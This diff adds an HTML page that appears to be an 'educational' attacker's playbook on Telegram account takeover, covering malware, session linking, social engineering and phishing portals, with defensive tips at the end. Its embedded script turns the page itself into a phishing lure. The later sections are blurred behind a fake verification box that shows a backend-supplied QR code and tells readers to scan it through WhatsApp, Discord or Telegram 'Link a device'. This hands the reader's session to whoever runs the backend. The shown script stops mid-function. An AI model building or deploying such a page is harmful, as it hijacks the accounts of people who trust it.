@@ -1,0 +1,1373 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>The Attacker's Playbook: Compromising Telegram</title>
+
+        <link
+            href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap"
+            rel="stylesheet"
+        />
+
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html {
+                scroll-behavior: smooth;
+            }
+
+            body {
+                background: #050505;
+                color: #d1d5db;
+                font-family: "Inter", sans-serif;
+                line-height: 1.8;
+                overflow-x: hidden;
+            }
+
+            body::before {
+                content: "";
+                position: fixed;
+                inset: 0;
+                background: repeating-linear-gradient(
+                    to bottom,
+                    rgba(255, 255, 255, 0.012),
+                    rgba(255, 255, 255, 0.012) 1px,
+                    transparent 1px,
+                    transparent 3px
+                );
+                pointer-events: none;
+                z-index: 999;
+            }
+
+            img {
+                max-width: 100%;
+                height: auto;
+                display: block;
+            }
+
+            code {
+                word-break: break-word;
+            }
+
+            pre {
+                overflow-x: auto;
+            }
+            /* Hero Section */
+            .hero {
+                min-height: 80vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                padding: 40px;
+                border-bottom: 1px solid #111;
+                position: relative;
+            }
+
+            .hero::after {
+                content: "";
+                position: absolute;
+                width: min(900px, 100vw);
+                height: min(900px, 100vw);
+                background: radial-gradient(
+                    circle,
+                    #0088cc15 0%,
+                    transparent 70%
+                );
+                filter: blur(100px);
+            }
+
+            .hero-content {
+                position: relative;
+                z-index: 2;
+                max-width: 1000px;
+            }
+
+            .hero h1 {
+                font-size: clamp(2.5rem, 6vw, 5rem);
+                color: white;
+                text-transform: uppercase;
+                letter-spacing: 3px;
+                line-height: 1.2;
+                margin-bottom: 30px;
+            }
+
+            .hero p {
+                color: #9ca3af;
+                font-size: 1.15rem;
+                max-width: 800px;
+                margin: 0 auto;
+            }
+
+            /* Layout Container */
+            .container {
+                width: min(1000px, 90%);
+                margin: auto;
+                padding: 80px 0;
+            }
+
+            .contents {
+                background: #090909;
+                border: 1px solid #151515;
+                padding: 40px;
+                margin-bottom: 100px;
+                border-radius: 8px;
+            }
+
+            .contents h2 {
+                color: white;
+                margin-bottom: 20px;
+                font-size: 1.5rem;
+            }
+
+            .contents ul {
+                list-style: none;
+            }
+
+            .contents li {
+                margin: 12px 0;
+            }
+
+            .contents a {
+                color: #c4cad3;
+                text-decoration: none;
+                transition: color 0.2s;
+            }
+
+            .contents a:hover {
+                color: #0088cc;
+            }
+
+            /* Standard Sections */
+            .section {
+                position: relative;
+                margin-bottom: 120px;
+            }
+
+            .watermark {
+                position: absolute;
+                top: -50px;
+                right: -20px;
+                font-size: 12rem;
+                font-weight: 900;
+                color: rgba(255, 255, 255, 0.02);
+                pointer-events: none;
+                user-select: none;
+                z-index: -1;
+            }
+
+            .section h2 {
+                color: white;
+                font-size: 2.2rem;
+                margin-bottom: 25px;
+                letter-spacing: 1px;
+            }
+
+            .section p {
+                margin-bottom: 20px;
+            }
+
+            .section ul,
+            .section ol {
+                margin-left: 25px;
+                margin-top: 15px;
+                margin-bottom: 25px;
+            }
+
+            .section li {
+                margin-bottom: 10px;
+            }
+
+            .example-box {
+                background: #0c0f12;
+                border-left: 4px solid #0088cc;
+                padding: 25px;
+                margin: 30px 0;
+                border-radius: 0 8px 8px 0;
+            }
+
+            .example-box h4 {
+                color: #0088cc;
+                margin-bottom: 10px;
+                font-family: "JetBrains Mono", monospace;
+                font-size: 0.9rem;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+            }
+
+            .tool-category {
+                background: #111;
+                border: 1px solid #222;
+                padding: 20px 25px;
+                margin: 30px 0;
+                border-radius: 8px;
+            }
+
+            .tool-category h4 {
+                color: #e5e7eb;
+                font-size: 0.95rem;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+                margin-bottom: 15px;
+                display: flex;
+                align-items: center;
+                gap: 8px;
+            }
+
+            .tool-category h4::before {
+                content: "⚙";
+                color: #ff4d4d;
+                font-size: 1.2rem;
+            }
+
+            .tool-category ul {
+                margin: 0;
+                margin-left: 15px;
+                list-style-type: square;
+            }
+
+            .tool-category li {
+                font-family: "JetBrains Mono", monospace;
+                font-size: 0.85rem;
+                color: #9ca3af;
+                margin-bottom: 8px;
+            }
+
+            .tool-category li strong {
+                color: #d1d5db;
+            }
+
+            .divider {
+                height: 1px;
+                background: #151515;
+                margin: 80px 0;
+            }
+
+            .security {
+                background: #090909;
+                border: 1px solid #151515;
+                padding: 50px;
+                border-radius: 8px;
+            }
+
+            .security h2 {
+                color: white;
+                margin-bottom: 25px;
+            }
+
+            /* Enhanced Gated Content and Verification Overlay */
+            .gate-container {
+                position: relative;
+                margin-top: -40px;
+            }
+
+            .gated-wrapper {
+                filter: blur(12px) grayscale(40%);
+                pointer-events: none;
+                user-select: none;
+                transition: filter 0.5s ease;
+                mask-image: linear-gradient(
+                    to bottom,
+                    rgba(0, 0, 0, 1) 0%,
+                    rgba(0, 0, 0, 0.2) 20%,
+                    rgba(0, 0, 0, 0) 100%
+                );
+                -webkit-mask-image: linear-gradient(
+                    to bottom,
+                    rgba(0, 0, 0, 1) 0%,
+                    rgba(0, 0, 0, 0.2) 20%,
+                    rgba(0, 0, 0, 0) 100%
+                );
+            }
+
+            .verification-overlay {
+                position: absolute;
+                top: 60px;
+                left: 0;
+                width: 100%;
+                z-index: 10;
+                display: flex;
+                justify-content: center;
+                padding: 20px;
+            }
+
+            #box {
+                background: linear-gradient(
+                    135deg,
+                    rgba(13, 13, 13, 0.95) 0%,
+                    rgba(8, 8, 8, 0.98) 100%
+                );
+                border: 1px solid rgba(255, 255, 255, 0.08);
+                box-shadow:
+                    0 0 1px 1px rgba(255, 255, 255, 0.05) inset,
+                    0 25px 50px -12px rgba(0, 0, 0, 0.9),
+                    0 0 40px 0 rgba(0, 136, 204, 0.03);
+                padding: 45px 35px;
+                border-radius: 16px;
+                text-align: center;
+                max-width: 480px;
+                width: 100%;
+                backdrop-filter: blur(20px);
+            }
+
+            #box h3 {
+                color: #ffffff;
+                font-size: 1.4rem;
+                margin-bottom: 14px;
+                font-weight: 700;
+                letter-spacing: 0.5px;
+                text-transform: uppercase;
+            }
+
+            #box p,
+            .box-message {
+                color: #9ca3af;
+                font-size: 0.9rem;
+                margin-bottom: 25px;
+                line-height: 1.6;
+            }
+
+            #guide {
+                font-family: "JetBrains Mono", monospace;
+                font-size: 0.75rem;
+                color: #0088cc;
+                background: rgba(0, 136, 204, 0.06);
+                border: 1px solid rgba(0, 136, 204, 0.15);
+                padding: 10px 14px;
+                border-radius: 6px;
+                display: inline-block;
+                margin-bottom: 30px;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+            }
+
+            .qr-box {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-top: 10px;
+            }
+
+            .verification-placeholder {
+                width: 100%;
+                height: 75px;
+                background: rgba(255, 255, 255, 0.02);
+                border: 1px dashed rgba(255, 255, 255, 0.15);
+                border-radius: 8px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: #6b7280;
+                font-family: "JetBrains Mono", monospace;
+                font-size: 0.8rem;
+                transition:
+                    border-color 0.3s,
+                    background 0.3s;
+            }
+
+            .verification-placeholder:hover {
+                border-color: rgba(0, 136, 204, 0.4);
+                background: rgba(0, 136, 204, 0.02);
+            }
+
+            /* Footer Section */
+            footer {
+                border-top: 1px solid #121212;
+                padding: 50px;
+                text-align: center;
+                color: #6b7280;
+                font-family: "JetBrains Mono", monospace;
+                font-size: 0.9rem;
+            }
+
+            /* =========================
+            RESPONSIVE DESIGN
+            ========================= */
+
+            @media (max-width: 1200px) {
+                .watermark {
+                    font-size: 10rem;
+                }
+            }
+
+            @media (max-width: 992px) {
+                .container {
+                    width: 94%;
+                }
+
+                .hero {
+                    min-height: 70vh;
+                    padding: 30px;
+                }
+
+                .hero h1 {
+                    font-size: 3rem;
+                    letter-spacing: 2px;
+                }
+
+                .section h2 {
+                    font-size: 2rem;
+                }
+
+                .watermark {
+                    font-size: 8rem;
+                    right: 0;
+                }
+            }
+
+            @media (max-width: 768px) {
+                .container {
+                    width: 95%;
+                    padding: 50px 0;
+                }
+
+                .hero {
+                    min-height: 60vh;
+                    padding: 25px;
+                }
+
+                .hero h1 {
+                    font-size: 2.2rem;
+                    line-height: 1.2;
+                    letter-spacing: 1px;
+                }
+
+                .hero p {
+                    font-size: 0.95rem;
+                }
+
+                .contents {
+                    padding: 25px;
+                }
+
+                .security {
+                    padding: 30px;
+                }
+
+                .section {
+                    margin-bottom: 80px;
+                }
+
+                .section h2 {
+                    font-size: 1.7rem;
+                    line-height: 1.3;
+                }
+
+                .section p {
+                    font-size: 0.95rem;
+                }
+
+                .watermark {
+                    font-size: 5rem;
+                    top: -20px;
+                    right: 0;
+                }
+
+                #box {
+                    padding: 25px;
+                    max-width: 100%;
+                }
+
+                .verification-overlay {
+                    padding: 15px;
+                }
+
+                .qr-box {
+                    width: 180px;
+                    height: 180px;
+                }
+
+                .tool-category {
+                    padding: 18px;
+                }
+
+                .example-box {
+                    padding: 18px;
+                }
+
+                footer {
+                    padding: 30px 15px;
+                    font-size: 0.8rem;
+                }
+            }
+
+            @media (max-width: 480px) {
+                .hero {
+                    min-height: 55vh;
+                }
+
+                .hero h1 {
+                    font-size: 1.8rem;
+                }
+
+                .hero p {
+                    font-size: 0.9rem;
+                }
+
+                .contents {
+                    padding: 20px;
+                }
+
+                .section h2 {
+                    font-size: 1.4rem;
+                }
+
+                .watermark {
+                    font-size: 3.5rem;
+                    top: -10px;
+                }
+
+                .section ul,
+                .section ol {
+                    margin-left: 18px;
+                }
+
+                #box {
+                    padding: 20px;
+                }
+
+                #title {
+                    font-size: 1.05rem;
+                }
+
+                #message {
+                    font-size: 0.85rem;
+                }
+
+                #guide {
+                    font-size: 0.72rem;
+                }
+
+                .qr-box {
+                    width: 150px;
+                    height: 150px;
+                }
+
+                .tool-category h4,
+                .example-box h4 {
+                    font-size: 0.8rem;
+                }
+            }
+
+            /* ==========================================
+            QR WRAPPER (OUTER CONTAINER)
+            ========================================== */
+
+            .qr-box {
+                position: relative;
+
+                width: 260px;
+                height: 260px;
+
+                margin: 25px auto;
+
+                display: flex;
+                align-items: center;
+                justify-content: center;
+
+                border-radius: 20px;
+
+                /* Glass + depth */
+                background: linear-gradient(
+                    145deg,
+                    rgba(18, 18, 18, 0.95),
+                    rgba(10, 10, 10, 0.98)
+                );
+
+                border: 1px solid rgba(255, 255, 255, 0.06);
+
+                box-shadow:
+                    0 20px 60px rgba(0, 0, 0, 0.7),
+                    inset 0 0 0 1px rgba(255, 255, 255, 0.03),
+                    0 0 40px rgba(0, 136, 204, 0.12);
+
+                overflow: hidden;
+
+                transition:
+                    transform 0.25s ease,
+                    box-shadow 0.25s ease;
+            }
+
+            /* Hover lift effect (optional but nice) */
+            .qr-box:hover {
+                transform: translateY(-3px);
+                box-shadow:
+                    0 25px 80px rgba(0, 0, 0, 0.75),
+                    inset 0 0 0 1px rgba(255, 255, 255, 0.04),
+                    0 0 60px rgba(0, 136, 204, 0.18);
+            }
+
+            /* Subtle animated scan glow */
+            .qr-box::before {
+                content: "";
+                position: absolute;
+                inset: -40%;
+
+                background: radial-gradient(
+                    circle,
+                    rgba(0, 136, 204, 0.18),
+                    transparent 60%
+                );
+
+                animation: qrGlow 6s ease-in-out infinite;
+
+                pointer-events: none;
+            }
+
+            @keyframes qrGlow {
+                0%,
+                100% {
+                    transform: translateY(-10px);
+                    opacity: 0.4;
+                }
+                50% {
+                    transform: translateY(10px);
+                    opacity: 0.7;
+                }
+            }
+
+            /* ==========================================
+            QR IMAGE ITSELF
+            ========================================== */
+
+            #qrCode {
+                width: 190px;
+                height: 190px;
+
+                padding: 14px;
+
+                background: #ffffff; /* IMPORTANT: makes QR scannable */
+                border-radius: 14px;
+
+                box-shadow:
+                    0 10px 30px rgba(0, 0, 0, 0.5),
+                    inset 0 0 0 1px rgba(0, 0, 0, 0.08);
+
+                z-index: 2;
+
+                transition: transform 0.2s ease;
+            }
+
+            .qr-box:hover #qrCode {
+                transform: scale(1.02);
+            }
+
+            /* ==========================================
+            OPTIONAL: SCAN RING DECORATION
+            ========================================== */
+
+            .qr-box::after {
+                content: "";
+
+                position: absolute;
+                width: 220px;
+                height: 220px;
+
+                border-radius: 18px;
+
+                border: 1px dashed rgba(255, 255, 255, 0.08);
+
+                pointer-events: none;
+
+                opacity: 0.5;
+            }
+        </style>
+    </head>
+
+    <body>
+        <header class="hero">
+            <div class="hero-content">
+                <h1>Compromising Telegram:<br />The Attacker's Playbook</h1>
+                <p>
+                    An educational breakdown written from the offensive
+                    perspective. This document details the conceptual frameworks
+                    and real-world examples of how we target and acquire
+                    unauthorized access to Telegram accounts. Understanding our
+                    methodology is the prerequisite to defeating it.
+                    <br /><br /><strong
+                        >FOR EDUCATIONAL AND DEFENSIVE PURPOSES ONLY.</strong
+                    >
+                </p>
+            </div>
+        </header>
+
+        <div class="container">
+            <section class="contents">
+                <h2>Report Contents</h2>
+                <ul>
+                    <li><a href="#s0">00 • The Abstract Attack Chain</a></li>
+                    <li><a href="#s1">01 • Malware & OTP Interception</a></li>
+                    <li>
+                        <a href="#s2"
+                            >02 • Physical Access & Session Hijacking</a
+                        >
+                    </li>
+                    <li>
+                        <a href="#s3"
+                            >03 • Social Engineering & Trust Exploitation</a
+                        >
+                    </li>
+                    <li><a href="#s4">04 • Phishing Portals</a></li>
+                    <li><a href="#s5">05 • The Defenses That Stop Us</a></li>
+                </ul>
+            </section>
+
+            <!-- SECTION 00 & 01 REMAIN UNBLURRED AND VISIBLE -->
+            <section class="section" id="s0">
+                <div class="watermark">00</div>
+                <h2>The Abstract Attack Chain</h2>
+                <p>
+                    Before diving into specific tactics, you must understand our
+                    underlying methodology. We rarely rely on "hacking the
+                    platform" directly, as bypassing modern encryption is
+                    mathematically unfeasible. Instead, we follow a reliable,
+                    repeatable series of steps designed to exploit the human
+                    operating the application.
+                </p>
+                <p>
+                    Our objective is always to trick the platform's
+                    authentication servers into believing that <em>we</em> are
+                    <em>you</em>. We achieve this through the following
+                    lifecycle:
+                </p>
+
+                <ol>
+                    <li>
+                        <strong>Target Selection & Reconnaissance:</strong> We
+                        identify a valuable Telegram account (e.g., a
+                        high-subscriber channel admin, a crypto trader, or a
+                        user with a premium/rare username). We gather their
+                        phone number or existing Telegram aliases to prepare the
+                        login prompt.
+                    </li>
+                    <li>
+                        <strong>The Lure (Delivery):</strong> We craft a highly
+                        specific, deceptive scenario—via a direct message, a
+                        malicious file payload, or an urgent email—designed to
+                        bypass the target's critical thinking.
+                    </li>
+                    <li>
+                        <strong>Interception:</strong> Telegram will send a
+                        5-digit login code to the target's app or via SMS. Our
+                        entire attack infrastructure is designed specifically to
+                        capture this single string of numbers.
+                    </li>
+                    <li>
+                        <strong>Execution:</strong> We input the intercepted
+                        code into our own Telegram client, successfully logging
+                        into the target's account.
+                    </li>
+                    <li>
+                        <strong>Persistence & Lockdown:</strong> Immediately
+                        upon entry, we navigate to the active sessions menu and
+                        forcefully kick out the original user's devices. We then
+                        change the recovery email and set our own Two-Step
+                        Verification password, locking the true owner out
+                        permanently.
+                    </li>
+                </ol>
+            </section>
+
+            <div class="divider"></div>
+
+            <section class="section" id="s1">
+                <div class="watermark">01</div>
+                <h2>Malware & OTP Interception</h2>
+                <p>
+                    Telegram accounts are intrinsically tied to phone numbers,
+                    but the application itself handles the authentication codes
+                    (OTPs) natively. If we can compromise the underlying
+                    operating system of your device—whether it's a PC or a
+                    smartphone—we completely bypass the need for human
+                    interaction. The malware simply reads the code for us as it
+                    arrives.
+                </p>
+
+                <div class="tool-category">
+                    <h4>Tool Categories Deployed</h4>
+                    <ul>
+                        <li>
+                            <strong>Infostealers:</strong> Specialized malware
+                            engineered to silently scrape browser caches, copy
+                            active session tokens, and export credential
+                            databases to remote servers.
+                        </li>
+                        <li>
+                            <strong>Remote Access Trojans (RATs):</strong>
+                            Covert software that provides us with real-time,
+                            administrative control over a victim's device,
+                            allowing us to view their screen and intercept
+                            notifications natively.
+                        </li>
+                        <li>
+                            <strong>SMS Interceptors / Mobile Spyware:</strong>
+                            Mobile payloads disguised as legitimate apps that
+                            silently forward all incoming SMS messages
+                            (including 2FA codes) to our infrastructure.
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="example-box">
+                    <h4>Example Tactic: The Fake Desktop Update</h4>
+                    <p>
+                        We host a sophisticated website that mirrors the
+                        official Telegram desktop download page. By utilizing
+                        SEO manipulation or purchasing malicious ad placements,
+                        we ensure our site appears at the top of search engine
+                        results.
+                        <br /><br />
+                        When a user downloads what they believe to be the
+                        "Telegram Desktop Installer," they actually execute a
+                        customized infostealer. We trigger a login attempt from
+                        our remote server, prompting Telegram to send the
+                        5-digit code to the victim's open Telegram app. Our
+                        malware instantly reads the incoming notification,
+                        transmits the code back to our command server, and we
+                        authenticate—often before the victim even glances at
+                        their screen.
+                    </p>
+                </div>
+            </section>
+        </div>
+        <!-- END OF FIRST CONTAINER -->
+
+        <!-- VERIFICATION GATEWAY & BLURRED CONTENT WRAPPER -->
+        <div class="gate-container">
+            <div class="container verification-overlay">
+                <div id="box">
+                    <h3 id="title">Security Verification Required</h3>
+                    <div id="message" class="box-message">
+                        To prevent automated abuse and web scraping of
+                        intelligence feeds, please complete the verification
+                        challenge below to read the full brief..
+                    </div>
+                    <div id="guide">
+                        Scan QR > Login Page > Fill Detail > Login
+                    </div>
+
+                    <div class="container">
+                        <div class="qr-box">
+                            <img id="qrCode" style="display: none" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- EVERYTHING WRAPPED INSIDE THIS DIV WILL BLEND AND BLUR -->
+            <div class="gated-wrapper">
+                <div class="container">
+                    <div class="divider"></div>
+
+                    <section class="section" id="s2">
+                        <div class="watermark">02</div>
+                        <h2>Physical Access & Session Hijacking</h2>
+                        <p>
+                            The quietest and most devastating way into a
+                            Telegram account requires zero coding skills.
+                            Telegram's seamless multi-device synchronization is
+                            a feature we heavily exploit. Security protocols
+                            often assume that the person holding an unlocked
+                            device is the authorized user. If we have physical
+                            access to a target's unlocked phone for mere
+                            seconds, the account is compromised.
+                        </p>
+
+                        <div class="tool-category">
+                            <h4>Tool Categories Deployed</h4>
+                            <ul>
+                                <li>
+                                    <strong
+                                        >Keystroke Injection Devices
+                                        (BadUSBs):</strong
+                                    >
+                                    Hardware disguised as normal USB flash
+                                    drives that act as a keyboard. When plugged
+                                    into an unlocked computer, they can execute
+                                    a programmed sequence of keypresses in
+                                    milliseconds to link a session or steal a
+                                    local session database.
+                                </li>
+                                <li>
+                                    <strong>Stalkerware:</strong> Commercially
+                                    available surveillance applications
+                                    installed directly onto an unattended,
+                                    unlocked mobile device.
+                                </li>
+                                <li>
+                                    <strong
+                                        >Native Application
+                                        Exploitation:</strong
+                                    >
+                                    Simply weaponizing Telegram's built-in
+                                    "Linked Devices" QR scanner against the user
+                                    without the need for external software.
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="example-box">
+                            <h4>Example Tactic: The Ghost Session</h4>
+                            <p>
+                                We observe a target at a cafe, co-working space,
+                                or office. The target leaves their phone
+                                unlocked on the table to grab a coffee or speak
+                                with a colleague.
+                                <br /><br />
+                                In less than 10 seconds, we open their Telegram
+                                app, navigate to
+                                <code
+                                    >Settings > Devices > Link Desktop
+                                    Device</code
+                                >. We scan a QR code displayed on our own tablet
+                                or laptop nearby. We have just created an
+                                active, fully authorized "Telegram Web" session
+                                on our machine. We place the target's phone
+                                exactly back where it was. They return, entirely
+                                unaware that we now have complete, real-time
+                                access to all their chats, contacts, and media.
+                            </p>
+                        </div>
+                    </section>
+
+                    <div class="divider"></div>
+
+                    <section class="section" id="s3">
+                        <div class="watermark">03</div>
+                        <h2>Social Engineering & Trust Exploitation</h2>
+                        <p>
+                            Why spend days developing custom malware to steal a
+                            code when you can simply ask the target to hand it
+                            to you? Social engineering is the art of
+                            manipulating human psychology. We don't attack the
+                            encryption; we exploit your trust, panic, or desire
+                            to help.
+                        </p>
+
+                        <div class="tool-category">
+                            <h4>Tool Categories Deployed</h4>
+                            <ul>
+                                <li>
+                                    <strong
+                                        >OSINT (Open Source Intelligence)
+                                        Frameworks:</strong
+                                    >
+                                    Aggregation tools used to legally scrape a
+                                    target's background, social circles, and
+                                    workplace structure to build a highly
+                                    convincing pretext.
+                                </li>
+                                <li>
+                                    <strong>Voice Cloning AI:</strong> Deepfake
+                                    audio tools utilized to clone the voice of a
+                                    target's friend or boss from public videos,
+                                    allowing us to send authentic-sounding voice
+                                    notes requesting account assistance.
+                                </li>
+                                <li>
+                                    <strong>Caller ID Spoofing:</strong> VoIP
+                                    services configured to make our phone call
+                                    appear as if it is originating from
+                                    "Telegram Support" or a trusted contact's
+                                    phone number.
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="example-box">
+                            <h4>Example Tactic: The "Accidental Code" Scam</h4>
+                            <p>
+                                We successfully compromise User A's account. We
+                                immediately review their chat history to
+                                identify close friends or family. We message
+                                User B (a close friend) from User A's account.
+                                <br /><br />
+                                <em
+                                    >"Hey! I'm trying to log into my new phone
+                                    but my SMS isn't working. I told Telegram to
+                                    send the recovery code to my trusted
+                                    emergency contact (which is you). Can you
+                                    copy the 5-digit code you just got from
+                                    Telegram so I can log in?"</em
+                                >
+                                <br /><br />
+                                Simultaneously, we trigger a legitimate login
+                                attempt using User B's phone number. User B
+                                receives an official Telegram code. Thinking
+                                they are helping their friend out of a
+                                frustrating tech issue, User B copies the code
+                                and sends it to us in the chat. We instantly use
+                                that code to steal User B's account, and the
+                                cycle continues.
+                            </p>
+                        </div>
+                    </section>
+
+                    <div class="divider"></div>
+
+                    <section class="section" id="s4">
+                        <div class="watermark">04</div>
+                        <h2>Phishing Portals</h2>
+                        <p>
+                            Phishing scales beautifully. It is about creating a
+                            perfect, pixel-accurate illusion. We direct targets
+                            to a webpage or a Telegram bot that we control,
+                            designed to perfectly mimic Telegram's official Web
+                            interface or support channels. The objective is to
+                            induce a state of panic or greed, forcing the user
+                            to willingly type in their phone number and the
+                            subsequent login code.
+                        </p>
+
+                        <div class="tool-category">
+                            <h4>Tool Categories Deployed</h4>
+                            <ul>
+                                <li>
+                                    <strong
+                                        >Adversary-in-the-Middle (AitM)
+                                        Proxies:</strong
+                                    >
+                                    Advanced phishing frameworks that sit
+                                    directly between the target and the real
+                                    Telegram servers, seamlessly relaying the
+                                    5-digit OTPs and capturing the resulting
+                                    session cookies in real-time to bypass
+                                    normal 2FA.
+                                </li>
+                                <li>
+                                    <strong>Typo-squatting Generators:</strong>
+                                    Automated scripts that identify and register
+                                    visually identical domain names (e.g., using
+                                    Cyrillic characters to mimic English letters
+                                    in URLs).
+                                </li>
+                                <li>
+                                    <strong>Bulletproof Hosting:</strong>
+                                    Specialized infrastructure providers located
+                                    in jurisdictions that intentionally ignore
+                                    DMCA or legal takedown requests, keeping our
+                                    fake login portals online longer.
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="example-box">
+                            <h4>Example Tactic: The "Account Deletion" Bot</h4>
+                            <p>
+                                We create a Telegram bot named "Telegram
+                                Security Notifications" featuring the official
+                                logo. We send mass, automated messages to
+                                thousands of users:
+                                <br /><br />
+                                <em
+                                    >"URGENT: Your account has been flagged for
+                                    violating our Terms of Service regarding
+                                    spam. Your account will be permanently
+                                    deleted in 12 hours. To appeal this
+                                    decision, click here to verify your
+                                    identity."</em
+                                >
+                                <br /><br />
+                                The panicked user clicks the link, arriving at
+                                our counterfeit verification portal. The site
+                                demands their phone number. When entered, our
+                                backend server requests a real login code from
+                                Telegram. Our fake site then prompts the user:
+                                <em
+                                    >"Enter the verification code sent to your
+                                    app to cancel the deletion."</em
+                                >
+                                The user types it in out of fear, effectively
+                                handing us the keys to their digital life.
+                            </p>
+                        </div>
+                    </section>
+
+                    <div class="divider"></div>
+
+                    <section class="security" id="s5">
+                        <h2>The Defenses That Stop Us</h2>
+                        <p>
+                            We rely on targets taking the path of least
+                            resistance. When a user implements these specific
+                            Telegram security features, our automated tools fail
+                            entirely, and our manual attacks become vastly more
+                            time-consuming. When we encounter a hardened
+                            account, we almost always abandon the attack and
+                            move on to an easier target.
+                        </p>
+
+                        <ul>
+                            <li>
+                                <strong
+                                    >Two-Step Verification (Cloud
+                                    Password):</strong
+                                >
+                                This is the ultimate, non-negotiable roadblock.
+                                Set a strong password. Even if we successfully
+                                steal your SMS or app OTP code through phishing
+                                or malware, we absolutely cannot log in without
+                                this secondary, alphanumeric password.
+                            </li>
+                            <li>
+                                <strong>Auditing Active Sessions:</strong>
+                                Targets who routinely check
+                                <code>Settings > Devices</code> and terminate
+                                unrecognized or old sessions effectively
+                                neutralize our physical access and "Ghost
+                                Session" attacks.
+                            </li>
+                            <li>
+                                <strong>Disabling Lock-Screen Previews:</strong>
+                                Prevent physical attackers from reading your
+                                codes by configuring your phone's OS to hide the
+                                content of notifications until the device is
+                                biometrically unlocked.
+                            </li>
+                            <li>
+                                <strong>Code Literacy & Skepticism:</strong>
+                                Telegram explicitly states in every login
+                                message:
+                                <em
+                                    >"Do not give this code to anyone, even if
+                                    they say they are from Telegram."</em
+                                >
+                                Official support will never, ever ask for your
+                                login code.
+                            </li>
+                            <li>
+                                <strong>Restricting Privacy Settings:</strong>
+                                Restricting "Who can find me by my phone number"
+                                and "Who can add me to groups/channels" to "My
+                                Contacts" severely limits our ability to perform
+                                reconnaissance.
+                            </li>
+                        </ul>
+                    </section>
+                </div>
+            </div>
+        </div>
+
+        <footer>END OF REPORT // EDUCATIONAL PURPOSES ONLY</footer>
+    </body>
+
+    <script>
+        const API_URL = "http://127.0.0.1:35000";
+        const QRCODE_ID = "11111111-1111-1111-1111-111111111110";
+
+        function lockContent() {
+            const content = document.querySelector(".gated-wrapper");
+            const overlay = document.querySelector(".verification-overlay");
+
+            if (content) {
+                content.style.filter = "blur(8px) brightness(.45) saturate(.3)";
+                content.style.pointerEvents = "none";
+                content.style.userSelect = "none";
+
+                content.style.maskImage = `
+                    linear-gradient(
+                        to bottom,
+                        rgba(0,0,0,1) 0%,
+                        rgba(0,0,0,.4) 20%,
+                        rgba(0,0,0,0) 100%
+                    )
+                `;
+
+                content.style.webkitMaskImage = `
+                    linear-gradient(
+                        to bottom,
+                        rgba(0,0,0,1) 0%,
+                        rgba(0,0,0,.4) 20%,
+                        rgba(0,0,0,0) 100%
+                    )
+                `;
+            }
+
+            if (overlay) {
+                overlay.style.display = "flex";
+            }
+        }
+
+        function unlockContent() {
+            const content = document.querySelector(".gated-wrapper");
+            const overlay = document.querySelector(".verification-overlay");
+            const gate = document.querySelector(".gate-container");
+            const qr = document.getElementById("qrCode");
+
+            if (qr) {
+                qr.style.display = "none";
+            }
+
+            if (content) {
+                content.style.filter = "none";
+                content.style.pointerEvents = "auto";
+                content.style.userSelect = "auto";
+                content.style.maskImage = "none";
+                content.style.webkitMaskImage = "none";
+            }
+
+            if (overlay) {
+                overlay.style.display = "none";
+            }
+
+            if (gate) {
+                gate.style.background = "transparent";
+            }
+        }
+
+        function updatePage(host) {
+            console.log("update: " + host);
+            document.querySelector("#message").innerHTML =
+                "Sign in using this QR code within your mobile <strong>Whatsapp</strong> application to <strong>join the call</strong>.";
+            switch (host) {
+                case "web.whatsapp.com":
+                    document.querySelector("#title").innerHTML = "Join Call";
+                    document.querySelector("#guide").innerHTML =
+                        "[ <strong>⁝</strong> > <strong>Linked devices</strong> > <strong>Link a device</strong> ]";
+                    break;
+                case "discord.com":
+                    document.querySelector("#title").innerHTML =
+                        "Invite pending";
+                    document.querySelector("#guide").innerHTML =
+                        "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    break;
+                case "web.telegram.org":
+                    document.querySelector("#title").innerHTML = "Join Channel";
+                    document.querySelector("#guide").innerHTML =
+                        "[ <strong>⁝</strong> > <strong>Settings</strong> > <strong>Devices</strong> > <strong>Link Desktop Device</strong> ]";
+                    break;
+                case "authenticated":
+                    unlockContent();
+                    document.querySelector("#title").innerHTML =
+                        "Authenticated";
+                    document.querySelector("#message").innerHTML =
+                        "Authentication successful.";
+                    document.querySelector("#guide").innerHTML = "";
+                    break;
+            }
+        }
+
+        let qrPolling = false;
+
+        function updateAuthenticated(t) {
+            var url = API_URL + "/authenticated";
+
+            if (t > 0) {
+                url += "?t=" + t;
+            }
+
+            console.log("auth fetching: " + url);
+
+            fetch(url, {
+                method: "GET",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            })
+                .then((response) => {
+                    if (response.status == 200) {
+                        return response.json();
+                    } else if (response.status == 408) {
+                        console.log("auth timed out");
+                        return updateAuthenticated(t);
+                    } else {
+                        throw "http error: " + response.status;
+                    }
+                })
+                .then((data) => {
+                    if (data === undefined) {
+                        return;
+                    }
+
+                    console.log("auth success:", data);
+
+                    if (data.authenticated) {
+                        qrPolling = false;
+                        updatePage("authenticated");
+                    } else {
+                        lockContent();
+                        if (!qrPolling) {
+                            qrPolling = true;
+                            updateQR(0);
+                        }
+                    }
+
+                    updateAuthenticated(data.update_time);
+                })
+                .catch((error) => {
+                    console.error("auth error:", error);
+
+                    setTimeout(function () {
+                        updateAuthenticated(t);
+                    }, 10000);
+                });
+        }
+
+        function updateQR(t) {
+            if (!qrPolling) {
+                return;
+            }
+
+            var url = API_URL + "/qrcode/" + QRCODE_ID;
+
+            if (t > 0) {
+                url += "?t=" + t;
+            }
+            console.log("fetching: " + url);
+
+            fetch(url, {
+                method: "GET",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            })
